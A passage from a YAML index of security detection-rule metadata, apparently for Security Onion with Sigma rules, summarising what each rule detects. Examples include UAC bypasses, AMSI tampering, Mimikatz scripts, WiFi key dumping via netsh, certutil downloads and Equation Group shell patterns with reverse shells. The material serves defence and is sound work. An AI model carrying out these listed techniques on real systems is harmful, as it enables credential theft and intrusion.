    \Control Panel\Desktop\SCRNSAVE.EXE where details end with .scr. The detection
    excludes instances where the details contain paths within C:\Windows\System32\
    or C:\Windows\SysWOW64\. This activity is indicative of potential defense evasion
    techniques within Windows systems.
  Updated-Date: '2024_09_04'
40b95d31-1afc-469e-8d34-9a3a667d058e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4490c82cc8a83c06fac825e78e0074f9
  Ruleset: sigmahq
  Summary: This rule detects the usage of csi.exe, a signed binary from Microsoft
    included with Visual Studio that facilitates C# interactive capabilities by running
    C# code from a file specified as a parameter in the command line. The tool was
    previously named rcsi.exe in early versions of the Microsoft "Roslyn" Community
    Technology Preview. This rule can identify both csi.exe and rcsi.exe usage, and
    its legitimate use is usually by software developers.
  Updated-Date: '2024_09_04'
40b9afdf-4322-433b-b812-b6f6751c4868:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 111113dc448851cb6f0851afbf0be454
  Ruleset: securityonion-resources
  Summary: "This rule detects when there is a login attempt on the FTP service of\
    \ a Security Onion Intrusion Detection Honeypot (IDH) node. The rule monitors\
    \ logs from the opencanary product specifically for events matching log type 2000.\
    \ This indicates an attempt to access the honeypot\u2019s FTP service, potentially\
    \ signaling unauthorized or suspicious activity."
  Updated-Date: '2024_08_07'
40cfc50a-7105-40ee-a95d-520c39b790c5:
  Created-Date: '2024_09_25'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6c401004a0a201e585b8248bf08d125b
  Ruleset: securityonion-resources
  Summary: This rule detects when the Security Onion Detections engine has entered
    a failure state. It specifically monitors for events where the action indicates
    that the detection engine has failed, in the context of the SOC server's health
    status. This condition alerts system administrators to potential issues within
    the Security Onion detection capabilities, enabling prompt troubleshooting and
    maintenance to ensure continued operational integrity.
  Updated-Date: '2024_09_25'
40f9af16-589d-4984-b78d-8c2aec023197:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f54e4994f2c38b23cd6e5c9881f11f9c
  Ruleset: sigmahq
  Summary: This rule detects the execution of `sdclt.exe` as an elevated process,
    which may indicate an attempt to bypass User Account Control (UAC) mechanisms.
    UAC bypass techniques commonly leverage elevated processes to gain higher privileges
    without user consent. Monitoring the execution of `sdclt.exe` with high integrity
    levels can help identify potential threats and malicious activity associated with
    privilege escalation and defense evasion tactics.
  Updated-Date: '2024_09_04'
41025fd7-0466-4650-a813-574aaacbe7f4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 43442d4030327de6c8246b1d9d15d042
  Ruleset: core
  Summary: This rule detects the execution of known offensive PowerShell scripts commonly
    used for exploitation or reconnaissance. PowerShell scripts such as those from
    PowerSploit, PowerUpSQL, and other repositories are identified, including specific
    scripts like 'Invoke-Mimikatz.ps1', 'Invoke-DCSync.ps1', 'Invoke-MalSCCM.ps1',
    and many others. These scripts are typically used to perform actions such as credential
    dumping, privilege escalation, command execution, and network reconnaissance.
    The rule targets contexts where these scripts are invoked, scrutinizing script
    names and execution commands within PowerShell modules to detect potentially harmful
    activity.
  Updated-Date: '2024_09_03'
4109cb6a-a4af-438a-9f0c-056abba41c6f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 50daad3b42bdc011e50cf924d4e0b552
  Ruleset: emerging-threats
  Summary: This rule detects modifications to the temporary XML user database file
    on a ScreenConnect server, which may indicate unauthorized local user changes.
    Specifically, it aims to identify exploitation attempts related to the ScreenConnect
    Authentication Bypass vulnerability (CVE-2024-1709) in versions earlier than 23.9.8.
    Such events are logged with Windows Event ID 4663 and occur within directories
    set with System Access Control Lists (SACL). This rule flags potentially malicious
    activity but can also capture legitimate modifications to user accounts or permissions.
  Updated-Date: '2024_09_03'
410d2a41-1e6d-452f-85e5-abdd8257a823:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ff982aab596b5658b1cb812081e1b6d6
  Ruleset: sigmahq
  Summary: This rule detects when an application is deleted in Azure, including both
    standard and hard deletion events. It identifies such actions via specific messages
    in activity logs, providing insights into potential defense evasion or impact
    tactics as defined by the ATT&CK framework. System administrators may perform
    these deletions, so it is crucial to verify user identity and examine if the behavior
    is expected or performed by unfamiliar users to identify false positives.
  Updated-Date: '2024_09_04'
412d55bc-7737-4d25-9542-5b396867ce55:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc3add19df40d482dc0d6937a1ab1e7f
  Ruleset: core
  Summary: This rule detects exploitation attempts using the JNDI-Exploit-Kit, which
    targets various webserver environments. The detection focuses on specific URL
    patterns and payloads associated with illicit activities such as command execution,
    reverse shell access, and deserialization attacks on web applications. These activities
    leverage components like Tomcat, Jetty, Weblogic, JBoss, Websphere, and Spring
    frameworks, as well as various bypass techniques. This detection methodology aims
    to identify malicious behavior indicative of attempts to exploit deserialization
    vulnerabilities, command injections, and memory shell deployments in webserver
    environments.
  Updated-Date: '2024_09_03'
413d4a81-6c98-4479-9863-014785fd579c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ceb0ad9562a7286e87d85faacfacb099
  Ruleset: sigmahq
  Summary: This rule detects when the Administrator role is assigned to a user or
    group within the Okta identity management service. This event may indicate potential
    privilege elevation, which is a technique often associated with persistence in
    various attack frameworks.
  Updated-Date: '2024_09_04'
41421f44-58f9-455d-838a-c398859841d4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ad83293e0b86a687e1083fba8a62c8ec
  Ruleset: core
  Summary: This rule detects changes to environment variables related to Event Tracing
    for Windows (ETW) logging via the CommandLine. These changes may indicate potential
    adversaries attempting to stop ETW providers from recording loaded .NET assemblies,
    which could be a defense evasion technique.
  Updated-Date: '2024_09_03'
41504465-5e3a-4a5b-a5b4-2a0baadd4463:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5e5e9377f751f5fa4b53b75fd0252659
  Ruleset: sigmahq
  Summary: This rule detects the creation of the default pipe used by the PsExec tool
    when the executing image is found in suspicious locations, such as user directories
    and temporary folders. PsExec is commonly used for remote execution and administration
    on Windows; however, its execution from unusual paths may indicate malicious activity.
    Proper logging for Named Pipe Events must be configured to capture this activity.
  Updated-Date: '2024_09_04'
4153a907-2451-4e4f-a578-c52bb6881432:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f3730bc0acc95c4d6faa634204f7a5fe
  Ruleset: sigmahq
  Summary: This rule detects suspicious DNS queries that contain base64 encoded strings.
    Base64 encoding in DNS queries can be indicative of attempts at data exfiltration
    or command-and-control communication.
  Updated-Date: '2024_09_04'
4186440c-ce77-46e6-991f-e26198389514:
  Created-Date: '2024_09_25'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 722ea349f052d107663f164f7f6f7473
  Ruleset: securityonion-resources
  Summary: This rule detects when nodes within the Security Onion grid require a reboot.
    The detection is based on specific events indicating that grid nodes are awaiting
    a reboot, as reported by the SOC server health service.
  Updated-Date: '2024_09_25'
418dc89a-9808-4b87-b1d7-e5ae0cb6effc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 15d0eb9cb7ef7e5038d616e36ef41087
  Ruleset: core
  Summary: This rule detects potential sideloading of the "mpclient.dll" file by monitoring
    Windows Defender processes, specifically "MpCmdRun.exe" and "NisSrv.exe," when
    they are executed from non-standard directories. Sideloading involves the manipulation
    of legitimate processes to load malicious code, in this case, potentially indicating
    an evasion technique or malicious activity such as the deployment of Cobalt Strike
    via ransomware like LockBit. The rule focuses on identifying discrepancies from
    default directory locations associated with Windows Defender.
  Updated-Date: '2024_09_03'
41bb431f-56d8-4691-bb56-ed34e390906f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d8573d6ca4769b67e0b45d2481f379cf
  Ruleset: core
  Summary: This rule detects a UAC (User Account Control) bypass technique involving
    the modification of tokens using the msconfig GUI hack, specifically identified
    as UACMe 55. It monitors for the creation of the 'pkgmgr.exe' file in the 'AppData\Local\Temp'
    directory within a user's profile on a Windows system. This activity is associated
    with defense evasion and privilege escalation attempts by attackers.
  Updated-Date: '2024_09_03'
41d1058a-aea7-4952-9293-29eaaf516465:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 74b74968c6b14b827c40b204b33294da
  Ruleset: core
  Summary: This rule detects the deletion of AMSI (Antimalware Scan Interface) provider
    registry key entries under the path HKLM\Software\Microsoft\AMSI. This activity
    could indicate an attempt by an attacker to disable AMSI inspection, which is
    used to prevent malicious code execution by scanning scripts and macros. The specific
    registry keys monitored for deletion are associated with IOfficeAntiVirus and
    ProtectionManagement.dll.
  Updated-Date: '2024_09_03'
41d40bff-377a-43e2-8e1b-2e543069e079:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f77c286751a440ac707f17f192726fa2
  Ruleset: emerging-threats
  Summary: This rule detects WannaCry ransomware activity on Windows systems by monitoring
    specific process creation behaviors and command line usage indicative of the ransomware.
    It specifically looks for process images ending with names such as 'tasksche.exe',
    'mssecsvc.exe', and 'wannacry.exe', among others, as well as commands containing
    'WanaDecryptor'. Additionally, it identifies command line patterns associated
    with WannaCry's malicious operations, including the use of 'icacls' to modify
    file permissions, 'bcdedit' to alter boot configuration, 'wbadmin' to delete backup
    catalogs, and the presence of '@Please_Read_Me@.txt' ransom note. The rule utilizes
    these detection methods to identify and alert on potential WannaCry ransomware
    infections to mitigate and prevent further damage.
  Updated-Date: '2024_09_03'
41e5c73d-9983-4b69-bd03-e13b67e9623c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3229e0135b791b41273dca8cfd036318
  Ruleset: core
  Summary: This rule detects suspicious shell commands used in various scripts and
    tools associated with the Equation Group. The rule identifies specific activities
    that may indicate malicious behavior, such as changing file ownership and permissions,
    copying files, and executing remote commands. It looks for patterns including
    commands like `chown root*chmod 4777`, copying `/bin/sh` with `chown` permissions,
    and specific paths like `/tmp/.scsi/dev/bin/gsh`. It also tracks commands related
    to tools like `ewok`, `xspy`, and others, as well as behavior like creating reverse
    shells, cleaning audit logs, and network communications involving `telnet` and
    `ncat`. Other detected activities include downloading files with `wget`, modifying
    system binaries, and manipulating processes like `sendmail` and `crond`. The detection
    focuses on patterns indicating potential unauthorized access, privilege escalation,
    and other forms of covert operations typically used by this advanced persistent
    threat group.
  Updated-Date: '2024_09_03'
41f407b5-3096-44ea-a74f-96d04fbc41be:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c395fd8e5812a1c24baaea198b773522
  Ruleset: sigmahq
  Summary: This rule detects the execution of an AnyDesk binary with a version prior
    to 8.0.8 on Windows systems. Prior to version 8.0.8, AnyDesk employed a signing
    certificate that was compromised by threat actors. This detection aims to identify
    and flag instances of older versions of AnyDesk that may be using this compromised
    certificate, thereby preventing attackers from leveraging the certificate to sign
    their binaries and potentially bypass security detections.
  Updated-Date: '2024_09_04'
41f6531d-af6e-4c6e-918f-b946f2b85a36:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fbeaa823c5de3504b5645297c5859ad5
  Ruleset: core
  Summary: This rule detects when an attacker attempts to achieve persistence by modifying
    the "REG_MULTI_SZ" value named "Extensions" to include a custom DLL. This entails
    adding filenames of DLLs to the list that is automatically loaded by the Local
    Security Authority Subsystem Service (lsass.exe). Upon loading, each DLL in this
    list executes its `InitializeLsaExtension()` method, potentially providing an
    attacker with a persistent foothold in the system.
  Updated-Date: '2024_09_03'
42127bdd-9133-474f-a6f1-97b6c08a4339:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: de0bf21015a014eab2dd9e724cb70100
  Ruleset: sigmahq
  Summary: This rule detects the addition of a new Federated Domain in Microsoft Exchange
    365. It captures events where the `eventSource` is Exchange and the `eventName`
    is 'Add-FederatedDomain' with a success status. The creation of a new Federated
    Domain can be legitimate but requires close monitoring as it may indicate federated
    credential abuse or the presence of a backdoor in federated identities across
    different cloud providers.
  Updated-Date: '2024_09_04'
42205c73-75c8-4a63-9db1-e3782e06fda0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d069e354563fe75f7e94b24db3b423c8
  Ruleset: core
  Summary: This rule detects applications being added to the "allowed applications"
    list of Windows Defender Exploit Guard, potentially to bypass controlled folder
    settings. The detection is based on identifying changes in the Windows registry
    specifically relating to the Controlled Folder Access AllowedApplications key
    under Microsoft Windows Defender. This activity is typically associated with defense
    evasion tactics, as it allows unapproved applications to avoid the protections
    offered by controlled folder settings, thereby increasing the risk of unauthorized
    access and potential malware execution.
  Updated-Date: '2024_09_03'
42333b2c-b425-441c-b70e-99404a17170f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 89ee5a73dde26a30c284bd031a8437a5
  Ruleset: core
  Summary: This rule detects process activity patterns indicative of Sliver C2 framework
    implants. The Sliver C2 framework is a post-exploitation command and control tool
    used by threat actors for managing compromised systems. The detection focuses
    on a specific command line pattern associated with this framework, specifically
    looking for instances where the command line contains `-NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8`.
    This signature is notably used within Sliver C2 implants to ensure proper output
    encoding in deployed environments.
  Updated-Date: '2024_09_03'
424273ea-7cf8-43a6-b712-375f925e481f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e641721cdba8074ce5b9818f4ed1f30a
  Ruleset: sigmahq
  Summary: This rule detects the execution of Scheduled Tasks on Windows systems where
    the program being run is located in a suspicious directory, such as temporary
    folders or user-specific directories like `\Desktop\`, `\Downloads\`, or `\AppData\Local`.
    The detection is based on Event ID 129, which indicates the creation of a task
    process by the Task Scheduler service. This behavior is often indicative of persistence
    mechanisms employed by malware or unauthorized software, particularly when programs
    are executed from unusual directories.
  Updated-Date: '2024_09_04'
4281cb20-2994-4580-aa63-c8b86d019934:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f4fc75364e42370ec0db7829568ed7fa
  Ruleset: sigmahq
  Summary: This rule detects the usage of attrib.exe to hide files from users by analyzing
    process creation logs in a Windows environment. Specifically, it flags instances
    where attrib.exe is executed with command-line arguments that modify file attributes
    to hidden (+h). The detection avoids false positives by filtering out known benign
    use cases such as system operations involving msiexec.exe or specific scripts
    initiated by igfxCUIService.exe. This technique is often associated with adversaries
    attempting to evade detection by concealing malicious files or their activities.
  Updated-Date: '2024_09_04'
42821614-9264-4761-acfc-5772c3286f76:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8800680ef668381f1ee3b31e0289ade2
  Ruleset: sigmahq
  Summary: This rule detects the installation of a root certificate on a Windows system
    using PowerShell commands. Adversaries may employ this technique to bypass security
    warnings when connecting to web servers under their control. The detection focuses
    on specific script block texts involving the PowerShell commands 'Move-Item' or
    'Import-Certificate' and their usage with the certificate path 'Cert:\LocalMachine\Root'.
    Such activities might be rare but could also arise from legitimate administrative
    actions, such as Help Desk IT adding a corporate Root CA.
  Updated-Date: '2024_09_04'
42a5f1e7-9603-4f6d-97ae-3f37d130d794:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9881d106306fb795b3992dd52e32e033
  Ruleset: sigmahq
  Summary: This rule detects the execution of the certutil.exe utility with specific
    command line flags that indicate it is being used to download files from file-sharing
    websites. By monitoring for certain URL patterns within the command line arguments,
    such as domains commonly associated with file-sharing services like githubusercontent.com,
    anonfiles.com, and mediafire.com, the rule identifies potentially suspicious file
    download activities. Certutil is a legitimate command line program used for various
    certificate authority operations, but it can be abused by attackers to download
    files from remote servers, making this detection method crucial for identifying
    potential security threats involving unauthorized or harmful downloads.
  Updated-Date: '2024_09_04'
42a993dd-bb3e-48c8-b372-4d6684c4106c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 71fc0314c5cf3931209a8cfa1f6848d2
  Ruleset: core
  Summary: This rule detects the execution of CrackMapExec, a post-exploitation tool
    used for conducting various network-based attacks, through specific flag combinations
    in the command line. It focuses on identifying several key usage patterns to detect
    the tool's activities, such as local authentication attempts, module executions,
    and the presence of specific flags and commands like `--local-auth`, `-u`, `-p`,
    `mssql`, and `smb`. The detection relies on examining process creation logs on
    Windows systems to spot these behaviors, aiming to uncover the use of CrackMapExec
    even if the executable has been obfuscated or replaced.
  Updated-Date: '2024_09_03'
42b1a5b8-353f-4f10-b256-39de4467faff:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e02df6a4b9cabec8fb778edecf74a028
  Ruleset: sigmahq
  Summary: This rule detects attempts to harvest WiFi credentials on a Windows system
    using the netsh.exe utility. The specific activity involves running netsh.exe
    with command-line parameters related to wireless LAN profiles, such as "wlan",
    "s", "p", and "k=clear". This behavior is commonly associated with credential
    theft activities, particularly linked to a variant of the AgentTesla malware,
    as it attempts to extract and potentially exfiltrate WiFi network credentials.
  Updated-Date: '2024_09_04'
42c575ea-e41e-41f1-b248-8093c3e82a28:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 904f7d63346ee44145c154ebf8e38b07
  Ruleset: sigmahq
  Summary: This rule detects the installation and execution events of the PsExec service
    by monitoring for specific indications in the Windows operating system, such as
    the presence of the 'Service Control Manager' event with Event ID 7045 and the
    installation of the 'PSEXESVC' service. PsExec is a utility used for running processes
    on remote systems, which can sometimes be exploited for malicious purposes.
  Updated-Date: '2024_09_04'
42d36aa1-3240-4db0-8257-e0118dcdd9cd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 13b7bbf46c043f3bca667773ead7a063
  Ruleset: sigmahq
  Summary: This rule detects the use of specific Hyper-V cmdlets within PowerShell
    scripts on Windows systems that adversaries may utilize to carry out malicious
    activities while evading detection. The suspicious cmdlets include actions such
    as creating a new virtual machine (New-VM), configuring the firmware of an existing
    virtual machine (Set-VMFirmware), and starting a virtual machine (Start-VM). These
    actions can represent potential attempts to mask malicious activities within a
    virtual environment, leveraging the native virtualization features provided by
    Hyper-V.
  Updated-Date: '2024_09_04'
43103702-5886-11ed-9b6a-0242ac120002:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2ebe0d0301b1980191951df82191838a
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Microsoft Visual Studio vsls-agent.exe
    with a suspicious library using the --agentExtensionPath parameter. This behavior
    can indicate an attempt to evade defenses, such as loading a potentially malicious
    library instead of the intended one. The detection specifically looks for the
    vsls-agent.exe process with the specified command line parameter, excluding any
    commands that include 'Microsoft.VisualStudio.LiveShare.Agent.'
  Updated-Date: '2024_09_04'
431a1fdb-4799-4f3b-91c3-a683b003fc49:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 03b396ec8720bb82124f58325e9e470b
  Ruleset: sigmahq
  Summary: This rule detects the creation of a new kernel driver service on Windows
    systems using the SC.EXE command-line tool. It specifically monitors for instances
    where the command includes keywords such as 'create', 'config', 'binPath', and
    'type' alongside 'kernel', which indicates the establishment of a service with
    the type set to kernel. This is typically associated with persistence and privilege
    escalation tactics, and while it may occasionally capture legitimate operations,
    it is primarily indicative of potential malicious activities like those involving
    unauthorized or weaponized drivers.
  Updated-Date: '2024_09_04'
434c08ba-8406-4d15-8b24-782cb071a691:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b4313cf40f07a5030355bafde42b6f16
  Ruleset: sigmahq
  Summary: This rule detects PowerShell commands associated with decrypting ".LNK"
    files to drop subsequent stages of malware. It specifically monitors the execution
    of PowerShell processes such as 'powershell.exe' and 'pwsh.exe,' along with command-line
    operations involving directory and content listing commands like "Get-ChildItem,"
    "Get-Content," and their aliases. It also identifies particular patterns in command
    lines that suggest the handling and decryption of ".LNK" files, including complex
    operations like recursive searches and property expansion. This activity is indicative
    of steps taken by malware, particularly in campaigns such as those attributed
    to Chinese threat actors targeting Europe.
  Updated-Date: '2024_09_04'
4358e5a5-7542-4dcb-b9f3-87667371839b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1963a049ab0b9c768f12607a09e3816b
  Ruleset: sigmahq
  Summary: This rule detects the creation of recent elements files pointing to .ISO,
    .IMG, .VHD, or .VHDX files on Windows systems. These file types are frequently
    used in phishing attacks to deliver malicious content, and their presence in recent
    files can be an indicator of such activity. While mounting such files may be justified
    on server systems, it is unusual for regular workstations to use these file types,
    which makes this detection particularly relevant for identifying potential threats
    on user machines.
  Updated-Date: '2024_09_04'
435e10e4-992a-4281-96f3-38b11106adde:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 00ee8c5976eddbc6a9887bcf18c36fbd
  Ruleset: sigmahq
  Summary: This rule detects the use of the Get-ADComputer cmdlet to gather computer
    information and export it to a file on Windows systems. The detection is based
    on process creation events where PowerShell or PowerShell Core is invoked with
    specific command parameters indicating the retrieval and filtering of Active Directory
    computer objects and the subsequent export of that data. The rule aims to identify
    potential unauthorized discovery and data exfiltration activities, although legitimate
    administrative scripts might exhibit similar behavior.
  Updated-Date: '2024_09_04'
435e41f2-48eb-4c95-8a2b-ed24b50ec30b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2c810eb69cfe8a93bdabb12e5f2af283
  Ruleset: emerging-threats
  Summary: This rule detects GET requests targeting specific files, '/human2.aspx'
    and '/_human2.aspx', which are associated with the exploitation of a critical
    vulnerability identified as MOVEit CVE-2023-34362. The vulnerability allows attackers
    to potentially install web shells on the affected server, thereby facilitating
    unauthorized access and persistence.
  Updated-Date: '2024_09_03'
4368354e-1797-463c-bc39-a309effbe8d7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 43f9f4eea7df128b4a4923faa96b1d42
  Ruleset: core
  Summary: This rule detects PowerShell scripts that add a Name Resolution Policy
    Table (NRPT) rule for a specified namespace, which allows the script to bypass
    the default DNS server and use a specified server for answering queries.
  Updated-Date: '2024_09_03'
438025f9-5856-4663-83f7-52f878a70a50:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d179f387b876b73bada90145acde5acb
  Ruleset: core
  Summary: This rule detects a suspicious process originating from any Microsoft Office
    suite product, such as Word, Excel, PowerPoint, Publisher, Visio, OneNote, and
    others. The rule monitors for child processes with specific filenames including
    "bitsadmin.exe," "certutil.exe," "cmd.exe," "cscript.exe," "curl.exe," "mshta.exe,"
    "powershell.exe," and others, which are often associated with malicious activities.
    It also identifies child processes located in directories like "\AppData\", "\Users\Public\",
    "\ProgramData\", "\Windows\Tasks\", "\Windows\Temp\", and "\Windows\System32\Tasks\",
    which are commonly used by attackers to evade detection. By flagging these child
    processes, this rule aims to identify potentially malicious behavior stemming
    from legitimate Office applications, often indicative of phishing attacks or exploitation
    attempts involving Office vulnerabilities like "Follina."
  Updated-Date: '2024_09_03'
439957a7-ad86-4a8f-9705-a28131c6821b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fc4b427bc16e47c761899287ed496b96
  Ruleset: sigmahq
  Summary: This rule detects applications or users re-enabling outdated TLS versions,
    such as TLS 1.0 and TLS 1.1, by setting the "Enabled" value to "1" in the "Protocols"
    registry key. This can indicate the use of these insecure protocols, which have
    been phased out for improved security in favor of newer versions. The specific
    registry paths monitored are under the "SCHANNEL\Protocols" key, with a detail
    value indicating that the protocol has been enabled.
  Updated-Date: '2024_09_04'
43d91656-a9b2-4541-b7e2-6a9bd3a13f4e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9ddb7fadabb2b757224fa8635636b63c
  Ruleset: sigmahq
  Summary: This rule detects the execution and usage of specific cmdlets from the
    DSInternals PowerShell module. DSInternals is a toolset that exposes several internal
    features of Active Directory and Azure Active Directory, allowing actions such
    as FIDO2 and NGC key auditing, offline manipulation of NTDS.dit files, password
    auditing, and domain controller recovery from IFM backups. The rule identifies
    commands related to operations like dumping DPAPI backup keys, manipulating NTDS.DIT
    files, password and key credential management, and system key retrieval. These
    activities may be deemed suspicious as they could indicate potential unauthorized
    actions against Active Directory infrastructure.
  Updated-Date: '2024_09_04'
43e32da2-fdd0-4156-90de-50dfd62636f9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4ea4efb95fef279fe0fad8a60f3f8149
  Ruleset: sigmahq
  Summary: This rule detects the use of the Deployment Image Servicing and Management
    (DISM) tool to disable features on Windows systems. Specifically, it monitors
    processes "DismHost.exe" or "Dism.exe" that run with command-line arguments indicating
    operations on online images and attempts to disable certain features. DISM is
    a Microsoft tool used for managing Windows images, including enumerating, installing,
    uninstalling, and updating various features and packages. The rule helps identify
    potential misuse of DISM for malicious activities like disabling security features
    for defense evasion.
  Updated-Date: '2024_09_04'
43fa5350-db63-4b8f-9a01-789a427074e1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 419569c6760e84138047fb62f317b7ec
  Ruleset: sigmahq
  Summary: This rule detects the execution of "rundll32.exe" utilizing potentially
    obfuscated ordinal calls on Windows systems. It triggers when the image execution
    path or original filename is associated with "rundll32.exe" and the command line
    contains specific patterns such as '#+' or '#-', which are indicative of obfuscation.
    This behavior is often related to defense evasion techniques.
  Updated-Date: '2024_09_04'
440a56bf-7873-4439-940a-1c8a671073c2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 49a9d5ae8767d8f79ec95d118cc8735a
  Ruleset: emerging-threats
  Summary: This rule detects indicators of compromise (IOCs) associated with the GALLIUM
    cyber espionage group. GALLIUM is known for targeting the global telecommunications
    sector. The rule identifies specific file hashes linked to GALLIUM's activity
    as outlined in a December 2019 report by the Microsoft Threat Intelligence Center.
    The detection focuses on process creation activities on Windows systems and uses
    hash values, including SHA256 and SHA1, to match known malicious files that have
    been used by the group for credential access and command-and-control communications.
  Updated-Date: '2024_09_03'
44143844-0631-49ab-97a0-96387d6b2d7c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fc6595a9e4b8b6697939cdc14fdc9a42
  Ruleset: core
  Summary: This rule detects the execution of the Notepad++ updater utility (GUP)
    from any process other than Notepad++ to download files. This is identified by
    monitoring for instances where the updater executable (gup.exe) is invoked with
    command-line arguments that include "-unzipTo" and a URL containing "http". The
    rule filters out cases where the parent process is Notepad++ itself, thus focusing
    on potentially anomalous uses of the updater utility for file downloads.
  Updated-Date: '2024_09_03'
4480827a-9799-4232-b2c4-ccc6c4e9e12b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d57e49e66d4f1d047dc92958a5323e70
  Ruleset: core
  Summary: This rule detects the suspicious use of the certreq command on Windows
    systems to download small files. The detection focuses on specific command line
    indicators related to certreq.exe, particularly when the command line includes
    sequences like `-Post`, `-config`, `http`, and references to the file path `C:\windows\win.ini`.
    The rule identifies potential command-and-control activities, where certreq.exe,
    typically used for certificate requests, is repurposed for unauthorized file downloads.
  Updated-Date: '2024_09_03'
448fd1ea-2116-4c62-9cde-a92d120e0f08:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f5fdd880d8aa058d162a82126dacf2ea
  Ruleset: sigmahq
  Summary: This rule detects when a service principal is removed in Azure, which is
    an action that can be associated with defense evasion tactics. A service principal
    in Azure is an identity created for use with applications, hosted services, and
    automated tools to access Azure resources. The removal of a service principal
    can indicate potential unauthorized changes or cleanup activities that may warrant
    further investigation.
  Updated-Date: '2024_09_04'
44a22d59-b175-4f13-8c16-cbaef5b581ff:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 821202270086b6a61fbfd2a8af4fe631
  Ruleset: core
  Summary: This rule detects the abuse of the "exefile" handler in new file associations
    within the Windows registry. This technique is often employed to bypass security
    products, as it manipulates the way executable files are associated and handled
    by the operating system.
  Updated-Date: '2024_09_03'
44b53b1c-e60f-4a7b-948e-3435a7918478:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1998df0a629492f95bfcc7cab3794a64
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit a vulnerability in F5 BIG-IP, which
    is cataloged as CVE-2020-5902. The vulnerability exists within the Traffic Management
    User Interface (tmui) and the HSQLDB database of the F5 BIG-IP application delivery
    controller. The rule identifies suspicious activity by monitoring specific URL
    query strings, particularly those containing patterns such as '/tmui/' or '/hsqldb'
    and traversal sequences like '..;/' or '.jsp/..'. The presence of these strings
    in web server logs suggests an exploitation attempt aiming to gain unauthorized
    access to the system or execute remote code.
  Updated-Date: '2024_09_03'
44bbff3e-4ca3-452d-a49a-6efa4cafa06f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
